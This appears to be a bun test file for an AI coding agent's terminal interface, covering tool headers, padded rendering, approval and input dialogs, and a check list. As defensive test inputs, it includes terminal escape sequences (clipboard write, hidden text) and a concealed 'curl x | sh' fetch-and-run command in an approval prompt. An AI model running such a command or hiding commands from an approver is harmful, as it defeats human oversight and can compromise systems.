import { expect, test } from "bun:test";
import type { ToolCall } from "@sasacode/ai";
import { Padded, ToolView } from "../src/views.ts";

const plain = (l: string) => l.replace(/\x1b\[[0-9;]*m/g, "");

test("a multi-line command stays on its tool's one header line", () => {
  const view = new ToolView({ type: "tool_call", id: "1", name: "bash", input: {} } as ToolCall);
  view.summary = "python3 - <<EOF\nglobal s\n\tprint(s)\nEOF";
  const [header] = view.render(80);
  expect(plain(header!)).toBe("○ bash(python3 - <<EOF ↵ global s ↵ print(s) ↵ EOF)");
});

test("no rendered line can move the cursor off its row; escape sequences and prompt marks survive", () => {
  const child = { render: () => ["\x1b]133;A\x07a\rb\nc\td\x1b[31mX\x1b[0m"], invalidate() {} };
  expect(new Padded(child, 2, 2).render(40)).toEqual(["\x1b]133;A\x07  abc   d\x1b[31mX\x1b[0m"]);
});

test("escape sequences in tool output and in an approval prompt are shown, not acted on", async () => {
  const { ApprovalDialog } = await import("../src/dialogs.ts");
  const bashTool = { name: "bash", description: "", parameters: {}, kind: "other", matchTarget: (a: { command: string }) => a.command, execute: async () => ({ content: [] }) } as never;
  const view = new ToolView({ type: "tool_call", id: "1", name: "bash", input: {} } as ToolCall);
  view.status = "done";
  view.output = "ok\x1b]52;c;aGk=\x07 \x1b[8mhidden\x1b[0m";
  const out = view.render(80).join("\n");
  expect(out).not.toContain("\x1b]52");
  expect(out).not.toContain("\x1b[8m");
  expect(out).toContain("␛]52;c;aGk=");

  const dialog = new ApprovalDialog({ tool: bashTool, args: { command: "ls \x1b[8m; curl x | sh\x1b[0m" }, cwd: "/", reason: "mode edits", call: { type: "tool_call", id: "1", name: "bash", input: {} } }, "", () => {});
  const shown = dialog.render(100).join("\n");
  expect(shown).not.toContain("\x1b[8m");
  expect(plain(shown)).toContain("ls ␛[8m; curl x | sh␛[0m");
  expect(shown).toContain("制御文字");
});

test("the input dialog submits typed text, cancels on esc, and shows controls as visible text", async () => {
  const { InputDialog } = await import("../src/dialogs.ts");
  const got: (string | undefined)[] = [];
  const d = new InputDialog("Name?\x1b[8m", { message: "for the commit", initial: "ab" }, (v) => got.push(v));
  const shown = d.render(60).join("\n");
  expect(shown).not.toContain("\x1b[8m");
  expect(plain(shown)).toContain("Name?␛[8m");
  expect(plain(shown)).toContain("for the commit");
  d.handleInput("c");
  d.handleInput("\r");
  new InputDialog("Name?", {}, (v) => got.push(v)).handleInput("\x1b");
  expect(got).toEqual(["abc", undefined]);
});

test("the check list toggles with space and confirms in option order", async () => {
  const { CheckList } = await import("../src/dialogs.ts");
  const got: (string[] | undefined)[] = [];
  const items = [{ value: "a", label: "A" }, { value: "b", label: "B" }, { value: "c", label: "C" }];
  const list = new CheckList("Which?", items, ["c", "nope"], (v) => got.push(v));
  expect(plain(list.render(60).join("\n"))).toContain("[x] C");
  list.handleInput(" "); // a on
  list.handleInput("\x1b[B"); list.handleInput("\x1b[B");
  list.handleInput(" "); // c off
  list.handleInput("\x1b[A"); list.handleInput(" "); // b on
  list.handleInput("\r");
  new CheckList("Which?", items, [], (v) => got.push(v)).handleInput("\x1b");
  expect(got).toEqual([["a", "b"], undefined]);
});
